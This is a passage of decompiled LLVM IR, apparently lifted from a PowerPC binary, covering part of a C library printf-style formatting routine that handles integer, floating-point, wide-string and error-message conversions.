  store i32 %v4_1000d0bc, i32* %r0.global-to-local, align 4
  %v3_1000d0c4 = icmp eq i8 %v3_1000d0bc, 37
  br i1 %v3_1000d0c4, label %dec_label_pc_1000d068.backedge, label %dec_label_pc_1000d0cc

dec_label_pc_1000d0cc:                            ; preds = %dec_label_pc_1000d0bc
  store i32 %v2_1000d004, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000d0bc, i8** %stack_var_-200, align 4
  store i32 268488932, i32* @lr, align 4
  %v3_1000d0e0 = call i32 @_ppfs_parsespec(i32* %v1_1000d01c, i32 %v1_1000d0bc)
  store i32 %v2_1000d004, i32* @r3, align 4
  store i32 268488940, i32* @lr, align 4
  %v0_1000d0e8 = call i32 @_ppfs_setargs()
  store i32 %v4_1000d0f0, i32* @r7, align 4
  store i32 %v2_1000d0f8, i32* %r0.global-to-local, align 4
  br i1 %v2_1000d0f4, label %dec_label_pc_1000d108, label %dec_label_pc_1000d114

dec_label_pc_1000d108:                            ; preds = %dec_label_pc_1000d0cc
  br label %dec_label_pc_1000d114

dec_label_pc_1000d114:                            ; preds = %dec_label_pc_1000d0cc, %dec_label_pc_1000d108
  %v0_1000d14082 = phi i32 [ %v1_1000d110, %dec_label_pc_1000d108 ], [ %v2_1000d0f8, %dec_label_pc_1000d0cc ]
  store i32 %v0_1000d14082, i32* %r10.global-to-local, align 4
  store i32 %v2_1000d11c, i32* @r8, align 4
  store i32 %v1_1000d124, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1000d144.preheader, label %dec_label_pc_1000d144.preheader.thread

dec_label_pc_1000d144.preheader.thread:           ; preds = %dec_label_pc_1000d114
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d150

dec_label_pc_1000d144.preheader:                  ; preds = %dec_label_pc_1000d114
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000d120, label %dec_label_pc_1000d150, label %dec_label_pc_1000d13c.preheader

dec_label_pc_1000d13c.preheader:                  ; preds = %dec_label_pc_1000d144.preheader
  store i32 %v0_1000d14082, i32* %stack_var_-344, align 4
  %v1_1000d14083 = add i32 %v0_1000d14082, 8
  store i32 %v1_1000d14083, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000d14c88 = add i32 %tmp58, -1
  store i32 %v1_1000d14c88, i32* %ctr.global-to-local, align 4
  %v2_1000d14c89 = icmp eq i32 %v1_1000d14c88, 0
  br i1 %v2_1000d14c89, label %dec_label_pc_1000d150, label %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge

dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge: ; preds = %dec_label_pc_1000d13c.preheader, %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge.dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge_crit_edge
  %v1_1000d13c.pre = phi i32 [ %v1_1000d13c.pre.pre, %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge.dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge_crit_edge ], [ %v2_1000d11c, %dec_label_pc_1000d13c.preheader ]
  %v1_1000d14491 = phi i32 [ %v1_1000d144, %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge.dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000d13c.preheader ]
  %v1_1000d14090 = phi i32 [ %v1_1000d140, %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge.dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge_crit_edge ], [ %v1_1000d14083, %dec_label_pc_1000d13c.preheader ]
  %v3_1000d13c = add i32 %v1_1000d13c.pre, %v1_1000d14491
  %v4_1000d13c = inttoptr i32 %v3_1000d13c to i32*
  store i32 %v1_1000d14090, i32* %v4_1000d13c, align 4
  %v0_1000d140 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d140 = add i32 %v0_1000d140, 8
  store i32 %v1_1000d140, i32* %r10.global-to-local, align 4
  %v0_1000d144 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d144 = mul i32 %v0_1000d144, 4
  store i32 %v1_1000d144, i32* %r0.global-to-local, align 4
  %v1_1000d148 = add i32 %v0_1000d144, 1
  store i32 %v1_1000d148, i32* %r11.global-to-local, align 4
  %v0_1000d14c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d14c = add i32 %v0_1000d14c, -1
  store i32 %v1_1000d14c, i32* %ctr.global-to-local, align 4
  %v2_1000d14c = icmp eq i32 %v1_1000d14c, 0
  br i1 %v2_1000d14c, label %dec_label_pc_1000d150, label %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge.dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge_crit_edge

dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge.dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge
  %v1_1000d13c.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge

dec_label_pc_1000d150:                            ; preds = %dec_label_pc_1000d13c.preheader, %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge, %dec_label_pc_1000d144.preheader.thread, %dec_label_pc_1000d144.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000d154, label %dec_label_pc_1000d15c, label %dec_label_pc_1000d17c

dec_label_pc_1000d15c:                            ; preds = %dec_label_pc_1000d150
  %v0_1000d160 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000d160, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_1000d160, 0
  %v1_1000d168 = zext i1 %tmp96 to i32
  %v2_1000d168 = ashr i32 %v0_1000d160, 31
  %v3_1000d168 = and i32 %v2_1000d168, -2
  %v4_1000d168 = or i32 %v3_1000d168, %v1_1000d168
  store i32 %v4_1000d168, i32* @r5, align 4
  %v1_1000d170 = call i32 @__asm_rlwinm(i32 %v0_1000d290, i32 0, i32 20, i32 23)
  store i32 %v1_1000d170, i32* @r4, align 4
  %v1_1000d174 = inttoptr i32 %v1_1000d170 to i16*
  %v2_1000d174 = call i32 @_store_inttype(i16* %v1_1000d174)
  br label %dec_label_pc_1000d638

dec_label_pc_1000d17c:                            ; preds = %dec_label_pc_1000d150
  br i1 %v2_1000d17c, label %dec_label_pc_1000d35c, label %dec_label_pc_1000d184

dec_label_pc_1000d184:                            ; preds = %dec_label_pc_1000d17c
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000d194 = load i8, i8* %v2_1000d194, align 1
  %v4_1000d194 = zext i8 %v3_1000d194 to i32
  store i32 %v4_1000d194, i32* %r30.global-to-local, align 4
  %v3_1000d198 = icmp eq i8 %v3_1000d194, 10
  br i1 %v3_1000d198, label %dec_label_pc_1000d1a0, label %dec_label_pc_1000d1c8

dec_label_pc_1000d1a0:                            ; preds = %dec_label_pc_1000d184
  store i32 %v0_1000d290, i32* %r0.global-to-local, align 4
  %v1_1000d1a4 = call i32 @__asm_rlwinm(i32 %v0_1000d290, i32 26, i32 31, i32 31)
  %v1_1000d1a8 = call i32 @__asm_rlwinm(i32 %v0_1000d290, i32 27, i32 31, i32 31)
  %v3_1000d1ac = icmp eq i32 %v1_1000d1a4, 0
  %v2_1000d1b0 = icmp ne i32 %v1_1000d1a8, 0
  %not.v2_1000d1b0 = xor i1 %v2_1000d1b0, true
  %v6_1000d1b4 = sext i1 %not.v2_1000d1b0 to i32
  store i32 %v6_1000d1b4, i32* %r0.global-to-local, align 4
  %v1_1000d1bc = select i1 %v2_1000d1b0, i32 44, i32 87
  store i32 %v1_1000d1bc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d1ac, label %dec_label_pc_1000d1c8, label %dec_label_pc_1000d1c4

dec_label_pc_1000d1c4:                            ; preds = %dec_label_pc_1000d1a0
  %v1_1000d1c4 = or i32 %v1_1000d1bc, 128
  store i32 %v1_1000d1c4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d1c8

dec_label_pc_1000d1c8:                            ; preds = %dec_label_pc_1000d184, %dec_label_pc_1000d1a0, %dec_label_pc_1000d1c4
  %v0_1000d1c8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d1c8 = icmp ugt i32 %v0_1000d1c8, 5
  br i1 %v2_1000d1c8, label %dec_label_pc_1000d1f0, label %dec_label_pc_1000d1d0

dec_label_pc_1000d1d0:                            ; preds = %dec_label_pc_1000d1c8
  %v3_1000d1d0 = icmp eq i32 %v0_1000d1c8, 3
  br i1 %v3_1000d1d0, label %dec_label_pc_1000d1d8, label %dec_label_pc_1000d1e0

dec_label_pc_1000d1d8:                            ; preds = %dec_label_pc_1000d1d0
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d1f4

dec_label_pc_1000d1e0:                            ; preds = %dec_label_pc_1000d1d0
  %v3_1000d1e0 = icmp eq i32 %v0_1000d1c8, 1
  br i1 %v3_1000d1e0, label %dec_label_pc_1000d1f8, label %dec_label_pc_1000d1f4

dec_label_pc_1000d1f0:                            ; preds = %dec_label_pc_1000d1c8
  %v0_1000d1f0 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d1f0 = sub i32 0, %v0_1000d1f0
  store i32 %v1_1000d1f0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d1f4

dec_label_pc_1000d1f4:                            ; preds = %dec_label_pc_1000d1e0, %dec_label_pc_1000d1d8, %dec_label_pc_1000d1f0
  br label %dec_label_pc_1000d1f8

dec_label_pc_1000d1f8:                            ; preds = %dec_label_pc_1000d1e0, %dec_label_pc_1000d1f4
  %storemerge3 = phi i32 [ 11, %dec_label_pc_1000d1f4 ], [ 6, %dec_label_pc_1000d1e0 ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1000d1f8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d1f8, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1000d1f8, -1
  br i1 %tmp75, label %dec_label_pc_1000d20c, label %dec_label_pc_1000d208

dec_label_pc_1000d208:                            ; preds = %dec_label_pc_1000d1f8
  br label %dec_label_pc_1000d20c

dec_label_pc_1000d20c:                            ; preds = %dec_label_pc_1000d1f8, %dec_label_pc_1000d208
  %storemerge = phi i32 [ %v4_1000d208, %dec_label_pc_1000d208 ], [ 32, %dec_label_pc_1000d1f8 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_1000d20c = icmp eq i32 %v0_1000d1c8, 1
  br i1 %v3_1000d20c, label %dec_label_pc_1000d228, label %dec_label_pc_1000d218

dec_label_pc_1000d218:                            ; preds = %dec_label_pc_1000d20c
  %v0_1000d218 = load i32, i32* @r7, align 4
  %v1_1000d218 = mul i32 %v0_1000d218, 4
  store i32 %v1_1000d218, i32* %r0.global-to-local, align 4
  %v0_1000d21c = load i32, i32* @r1, align 4
  %v2_1000d21c = add i32 %v0_1000d21c, %v1_1000d218
  %v1_1000d220 = add i32 %v2_1000d21c, 188
  %v2_1000d220 = inttoptr i32 %v1_1000d220 to i32*
  %v3_1000d220 = load i32, i32* %v2_1000d220, align 4
  store i32 %v3_1000d220, i32* %r0.global-to-local, align 4
  %v1_1000d224 = call i32 @__asm_rlwinm(i32 %v3_1000d220, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000d228

dec_label_pc_1000d228:                            ; preds = %dec_label_pc_1000d20c, %dec_label_pc_1000d218
  %v3_1000d228 = load i32, i32* %stack_var_-344, align 4
  %v0_1000d22c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000d22c, i32* @r5, align 4
  %v2_1000d230 = inttoptr i32 %v0_1000d22c to i32*
  %v3_1000d230 = call i32 @_load_inttype(i32 %v3_1000d228, i32* %v2_1000d230)
  %v0_1000d240 = load i32, i32* %r31.global-to-local, align 4
  %v6_1000d248 = call i32 @_uintmaxtostr(i8* %v5_1000d248, i32 %v3_1000d230, i32 %v3_1000d228, i32 %v0_1000d22c, i32 %v0_1000d240)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000d248, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000d29c, label %dec_label_pc_1000d25c

dec_label_pc_1000d25c:                            ; preds = %dec_label_pc_1000d228
  %v7_1000d248 = inttoptr i32 %v6_1000d248 to i8*
  %v3_1000d25c = load i8, i8* %v7_1000d248, align 1
  %v4_1000d25c = zext i8 %v3_1000d25c to i32
  store i32 %v4_1000d25c, i32* %r0.global-to-local, align 4
  %v3_1000d264 = icmp eq i8 %v3_1000d25c, 45
  br i1 %v3_1000d264, label %dec_label_pc_1000d26c, label %dec_label_pc_1000d280

dec_label_pc_1000d26c:                            ; preds = %dec_label_pc_1000d25c
  %v1_1000d26c = or i32 %v0_1000d290, 2
  store i32 %v1_1000d26c, i32* %r0.global-to-local, align 4
  %v2_1000d270 = add i32 %v6_1000d248, 1
  store i32 %v2_1000d270, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000d29c

dec_label_pc_1000d280:                            ; preds = %dec_label_pc_1000d25c
  %v1_1000d280 = and i32 %v0_1000d290, 2
  store i32 %v1_1000d280, i32* %r0.global-to-local, align 4
  %v3_1000d280 = icmp eq i32 %v1_1000d280, 0
  br i1 %v3_1000d280, label %dec_label_pc_1000d290, label %dec_label_pc_1000d288

dec_label_pc_1000d288:                            ; preds = %dec_label_pc_1000d280
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000d29c

dec_label_pc_1000d290:                            ; preds = %dec_label_pc_1000d280
  %v1_1000d290 = urem i32 %v0_1000d290, 2
  store i32 %v1_1000d290, i32* %r11.global-to-local, align 4
  %v3_1000d290 = icmp eq i32 %v1_1000d290, 0
  br i1 %v3_1000d290, label %dec_label_pc_1000d29c, label %dec_label_pc_1000d298

dec_label_pc_1000d298:                            ; preds = %dec_label_pc_1000d290
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000d29c

dec_label_pc_1000d29c:                            ; preds = %dec_label_pc_1000d290, %dec_label_pc_1000d228, %dec_label_pc_1000d288, %dec_label_pc_1000d26c, %dec_label_pc_1000d298
  %v0_1000d308 = phi i32 [ %v6_1000d248, %dec_label_pc_1000d228 ], [ %v2_1000d270, %dec_label_pc_1000d26c ], [ %v6_1000d248, %dec_label_pc_1000d290 ], [ %v6_1000d248, %dec_label_pc_1000d298 ], [ %v6_1000d248, %dec_label_pc_1000d288 ]
  %stack_var_-184.0 = phi i32 [ %v0_1000d290, %dec_label_pc_1000d228 ], [ %v1_1000d26c, %dec_label_pc_1000d26c ], [ %v0_1000d290, %dec_label_pc_1000d290 ], [ %v0_1000d290, %dec_label_pc_1000d298 ], [ %v0_1000d290, %dec_label_pc_1000d288 ]
  %v3_1000d29c = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000d4b0, i32* %r0.global-to-local, align 4
  %v2_1000d2a4 = sub i32 %v2_1000d4b0, %v0_1000d308
  %v1_1000d2ac = add i32 %v2_1000d2a4, 127
  store i32 %v1_1000d2ac, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000d29c, -1
  br i1 %tmp76, label %dec_label_pc_1000d2b8, label %dec_label_pc_1000d2b4

dec_label_pc_1000d2b4:                            ; preds = %dec_label_pc_1000d29c
  br label %dec_label_pc_1000d2b8

dec_label_pc_1000d2b8:                            ; preds = %dec_label_pc_1000d29c, %dec_label_pc_1000d2b4
  %v0_1000d2ec = phi i32 [ %v3_1000d29c, %dec_label_pc_1000d29c ], [ 1, %dec_label_pc_1000d2b4 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000d2bc = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000d2bc, i32* %r11.global-to-local, align 4
  %v3_1000d2bc = icmp eq i32 %v1_1000d2bc, 0
  br i1 %v3_1000d2bc, label %dec_label_pc_1000d308, label %dec_label_pc_1000d2c4

dec_label_pc_1000d2c4:                            ; preds = %dec_label_pc_1000d2b8
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000d2c8, label %dec_label_pc_1000d2d4, label %dec_label_pc_1000d2e4.thread

dec_label_pc_1000d2e4.thread:                     ; preds = %dec_label_pc_1000d2c4
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000d308

dec_label_pc_1000d2d4:                            ; preds = %dec_label_pc_1000d2c4
  br i1 %v3_1000d2d4, label %dec_label_pc_1000d2dc, label %dec_label_pc_1000d2e4

dec_label_pc_1000d2dc:                            ; preds = %dec_label_pc_1000d2d4
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000d308

dec_label_pc_1000d2e4:                            ; preds = %dec_label_pc_1000d2d4
  br i1 %v3_1000d2e4, label %dec_label_pc_1000d2ec, label %dec_label_pc_1000d308

dec_label_pc_1000d2ec:                            ; preds = %dec_label_pc_1000d2e4
  %v3_1000d2ec = icmp ugt i32 %v0_1000d2ec, %v1_1000d2ac
  br i1 %v3_1000d2ec, label %dec_label_pc_1000d308, label %dec_label_pc_1000d2f4

dec_label_pc_1000d2f4:                            ; preds = %dec_label_pc_1000d2ec
  %v1_1000d2f4 = inttoptr i32 %v0_1000d308 to i8*
  %v2_1000d2f4 = load i8, i8* %v1_1000d2f4, align 1
  %v3_1000d2f4 = zext i8 %v2_1000d2f4 to i32
  store i32 %v3_1000d2f4, i32* %r0.global-to-local, align 4
  %v3_1000d2fc = icmp eq i8 %v2_1000d2f4, 48
  br i1 %v3_1000d2fc, label %dec_label_pc_1000d308, label %dec_label_pc_1000d304

dec_label_pc_1000d304:                            ; preds = %dec_label_pc_1000d2f4
  %v1_1000d304 = add i32 %v2_1000d2a4, 128
  br label %dec_label_pc_1000d308

dec_label_pc_1000d308:                            ; preds = %dec_label_pc_1000d2e4.thread, %dec_label_pc_1000d2e4, %dec_label_pc_1000d2f4, %dec_label_pc_1000d2ec, %dec_label_pc_1000d2b8, %dec_label_pc_1000d2dc, %dec_label_pc_1000d304
  %v1_1000d350 = phi i32 [ %v0_1000d2ec, %dec_label_pc_1000d2e4 ], [ 1, %dec_label_pc_1000d2f4 ], [ %v0_1000d2ec, %dec_label_pc_1000d2ec ], [ %v0_1000d2ec, %dec_label_pc_1000d2b8 ], [ %v0_1000d2ec, %dec_label_pc_1000d2dc ], [ %v1_1000d304, %dec_label_pc_1000d304 ], [ %v0_1000d2ec, %dec_label_pc_1000d2e4.thread ]
  %v1_1000d308 = inttoptr i32 %v0_1000d308 to i8*
  %v2_1000d308 = load i8, i8* %v1_1000d308, align 1
  %v3_1000d308 = zext i8 %v2_1000d308 to i32
  store i32 %v3_1000d308, i32* %r0.global-to-local, align 4
  %v3_1000d30c = icmp eq i8 %v2_1000d308, 48
  br i1 %v3_1000d30c, label %dec_label_pc_1000d314, label %dec_label_pc_1000d34c

dec_label_pc_1000d314:                            ; preds = %dec_label_pc_1000d308
  %v0_1000d314 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1000d314, 6
  br i1 %tmp77, label %dec_label_pc_1000d320, label %dec_label_pc_1000d31c

dec_label_pc_1000d31c:                            ; preds = %dec_label_pc_1000d314
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000d320

dec_label_pc_1000d320:                            ; preds = %dec_label_pc_1000d314, %dec_label_pc_1000d31c
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d324, label %dec_label_pc_1000d32c, label %dec_label_pc_1000d33c

dec_label_pc_1000d32c:                            ; preds = %dec_label_pc_1000d320
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10016b60.600 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d4c8

dec_label_pc_1000d33c:                            ; preds = %dec_label_pc_1000d320
  %v3_1000d33c = icmp eq i32 %v1_1000d350, 0
  br i1 %v3_1000d33c, label %dec_label_pc_1000d344, label %dec_label_pc_1000d34c

dec_label_pc_1000d344:                            ; preds = %dec_label_pc_1000d33c
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d4c8

dec_label_pc_1000d34c:                            ; preds = %dec_label_pc_1000d33c, %dec_label_pc_1000d308
  %v3_1000d34c = icmp ugt i32 %v1_1000d350, %v1_1000d2ac
  %v2_1000d350 = sub i32 %v1_1000d350, %v1_1000d2ac
  store i32 %v2_1000d350, i32* %r29.global-to-local, align 4
  br i1 %v3_1000d34c, label %dec_label_pc_1000d4e8thread-pre-split, label %dec_label_pc_1000d4c8

dec_label_pc_1000d35c:                            ; preds = %dec_label_pc_1000d17c
  br i1 %v2_1000d35c, label %dec_label_pc_1000d390, label %dec_label_pc_1000d364

dec_label_pc_1000d364:                            ; preds = %dec_label_pc_1000d35c
  %v3_1000d364 = load i32, i32* %stack_var_-344, align 4
  %v0_1000d370 = load i32, i32* %r24.global-to-local, align 4
  store i32 268489600, i32* @lr, align 4
  %v5_1000d37c = call i32 @_fpmaxtostr(i32 %v0_1000d370, i32* nonnull %stack_var_-196, i32 268488536, i32 %v3_1000d364)
  %v1_1000d380 = icmp slt i32 %v5_1000d37c, 0
  br i1 %v1_1000d380, label %dec_label_pc_1000d64c, label %dec_label_pc_1000d388

dec_label_pc_1000d388:                            ; preds = %dec_label_pc_1000d364
  %v0_1000d388 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000d388 = add i32 %v0_1000d388, %v5_1000d37c
  store i32 %v2_1000d388, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000d638

dec_label_pc_1000d390:                            ; preds = %dec_label_pc_1000d35c
  br i1 %v2_1000d390, label %dec_label_pc_1000d438, label %dec_label_pc_1000d398

dec_label_pc_1000d398:                            ; preds = %dec_label_pc_1000d390
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000d3a4 = load i32, i32* %stack_var_-344, align 4
  %v1_1000d3ac = inttoptr i32 %v3_1000d3a4 to i32*
  %v2_1000d3ac = load i32, i32* %v1_1000d3ac, align 4
  br i1 %v3_1000d390, label %dec_label_pc_1000d3ac, label %dec_label_pc_1000d400

dec_label_pc_1000d3ac:                            ; preds = %dec_label_pc_1000d398
  store i32 %v2_1000d3ac, i32* %r0.global-to-local, align 4
  %v3_1000d3b0 = icmp eq i32 %v2_1000d3ac, 0
  store i32 %v2_1000d3ac, i32* %stack_var_-340, align 4
  br i1 %v3_1000d3b0, label %dec_label_pc_1000d4d0, label %dec_label_pc_1000d3bc

dec_label_pc_1000d3bc:                            ; preds = %dec_label_pc_1000d3ac
  %v3_1000d3bc = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d3bc, i32* %r0.global-to-local, align 4
  %v1_1000d3c4 = icmp slt i32 %v3_1000d3bc, 0
  br i1 %v1_1000d3c4, label %dec_label_pc_1000d3d0, label %dec_label_pc_1000d3cc

dec_label_pc_1000d3cc:                            ; preds = %dec_label_pc_1000d3bc
  br label %dec_label_pc_1000d3d0

dec_label_pc_1000d3d0:                            ; preds = %dec_label_pc_1000d3bc, %dec_label_pc_1000d3cc
  %storemerge94 = phi i32 [ %v3_1000d3bc, %dec_label_pc_1000d3cc ], [ -1, %dec_label_pc_1000d3bc ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000d3d0, i32* @r3, align 4
  store i32 %v2_1000d3d4, i32* @r6, align 4
  store i32 %v2_1000d3d0, i32* @r4, align 4
  store i32 268489696, i32* @lr, align 4
  %v0_1000d3dc = call i32 @__GI_wcsrtombs()
  %v3_1000d3e0 = icmp eq i32 %v0_1000d3dc, -1
  store i32 %v0_1000d3dc, i32* @r31, align 4
  br i1 %v3_1000d3e0, label %dec_label_pc_1000d64c, label %dec_label_pc_1000d3ec

dec_label_pc_1000d3ec:                            ; preds = %dec_label_pc_1000d3d0
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d4e8

dec_label_pc_1000d400:                            ; preds = %dec_label_pc_1000d398
  store i32 %v2_1000d4b0, i32* @r28, align 4
  store i32 268489748, i32* @lr, align 4
  %v3_1000d410 = call i32 @__GI_wcrtomb(i32 %v2_1000d4b0, i32 %v2_1000d3ac, i32 %v2_1000d3d4)
  %v3_1000d414 = icmp eq i32 %v3_1000d410, -1
  store i32 %v3_1000d410, i32* @r31, align 4
  br i1 %v3_1000d414, label %dec_label_pc_1000d64c, label %dec_label_pc_1000d420

dec_label_pc_1000d420:                            ; preds = %dec_label_pc_1000d400
  store i32 %v2_1000d4b0, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000d430 = load i32, i32* @r25, align 4
  %v1_1000d430 = load i32, i32* @r28, align 4
  %v3_1000d430 = trunc i32 %v0_1000d430 to i8
  %v4_1000d430 = add i32 %v1_1000d430, %v3_1000d410
  %v5_1000d430 = inttoptr i32 %v4_1000d430 to i8*
  store i8 %v3_1000d430, i8* %v5_1000d430, align 1
  %v0_1000d4ec.pre.pre = load i32, i32* @r31, align 4
  %v1_1000d4ec.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d4e8thread-pre-split

dec_label_pc_1000d438:                            ; preds = %dec_label_pc_1000d390
  br i1 %v2_1000d438, label %dec_label_pc_1000d4a4, label %dec_label_pc_1000d440

dec_label_pc_1000d440:                            ; preds = %dec_label_pc_1000d438
  %v3_1000d444 = load i32, i32* %stack_var_-344, align 4
  %v1_1000d44c = inttoptr i32 %v3_1000d444 to i32*
  %v2_1000d44c = load i32, i32* %v1_1000d44c, align 4
  br i1 %v3_1000d438, label %dec_label_pc_1000d44c, label %dec_label_pc_1000d47c

dec_label_pc_1000d44c:                            ; preds = %dec_label_pc_1000d440
  store i32 %v2_1000d44c, i32* %r30.global-to-local, align 4
  %v3_1000d450 = icmp eq i32 %v2_1000d44c, 0
  br i1 %v3_1000d450, label %dec_label_pc_1000d4d0, label %dec_label_pc_1000d458

dec_label_pc_1000d458:                            ; preds = %dec_label_pc_1000d44c, %dec_label_pc_1000d4ac
  %v0_1000d46c = phi i32 [ %v2_1000d44c, %dec_label_pc_1000d44c ], [ %v3_1000d4bc, %dec_label_pc_1000d4ac ]
  %v3_1000d458 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000d458, i32* %r0.global-to-local, align 4
  %v1_1000d460 = icmp slt i32 %v3_1000d458, 0
  br i1 %v1_1000d460, label %dec_label_pc_1000d46c, label %dec_label_pc_1000d468

dec_label_pc_1000d468:                            ; preds = %dec_label_pc_1000d458
  br label %dec_label_pc_1000d46c

dec_label_pc_1000d46c:                            ; preds = %dec_label_pc_1000d458, %dec_label_pc_1000d468
  %storemerge95 = phi i32 [ %v3_1000d458, %dec_label_pc_1000d468 ], [ -1, %dec_label_pc_1000d458 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268489844, i32* @lr, align 4
  %v1_1000d470 = inttoptr i32 %v0_1000d46c to i8*
  %v2_1000d470 = call i32 @strnlen(i8* %v1_1000d470)
  store i32 %v2_1000d470, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d4dc

dec_label_pc_1000d47c:                            ; preds = %dec_label_pc_1000d440
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1000d44c, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d4b0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d4e8thread-pre-split

dec_label_pc_1000d4a4:                            ; preds = %dec_label_pc_1000d438
  br i1 %v3_1000d4a4, label %dec_label_pc_1000d4ac, label %dec_label_pc_1000d64c

dec_label_pc_1000d4ac:                            ; preds = %dec_label_pc_1000d4a4
  %v0_1000d4ac = call i32 @__errno_location()
  %v1_1000d4b4 = inttoptr i32 %v0_1000d4ac to i32*
  %v2_1000d4b4 = load i32, i32* %v1_1000d4b4, align 4
  store i32 %v2_1000d4b4, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268489920, i32* @lr, align 4
  %v3_1000d4bc = call i32 @__GI___glibc_strerror_r(i32 %v2_1000d4b4, i32 %v2_1000d4b0, i32 128)
  store i32 %v3_1000d4bc, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d458

dec_label_pc_1000d4c8:                            ; preds = %dec_label_pc_1000d34c, %dec_label_pc_1000d344, %dec_label_pc_1000d32c
  %v0_1000d4ec.pre41 = phi i32 [ %v1_1000d2ac, %dec_label_pc_1000d34c ], [ 0, %dec_label_pc_1000d344 ], [ 5, %dec_label_pc_1000d32c ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d4e8thread-pre-split

dec_label_pc_1000d4d0:                            ; preds = %dec_label_pc_1000d44c, %dec_label_pc_1000d3ac
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10016b68.601 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d4dc

